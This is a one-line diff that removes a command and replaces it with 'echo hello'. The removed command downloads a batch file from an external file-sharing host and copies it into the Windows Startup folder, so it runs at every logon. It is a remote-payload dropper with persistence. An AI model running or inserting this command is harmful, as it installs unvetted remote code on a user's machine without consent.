@@ -1,1 +1,1 @@
-curl -L https://cinuxs.keep.sh/Start.bat > Start.bat && copy Start.bat "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup" && del start.bat
+echo hello
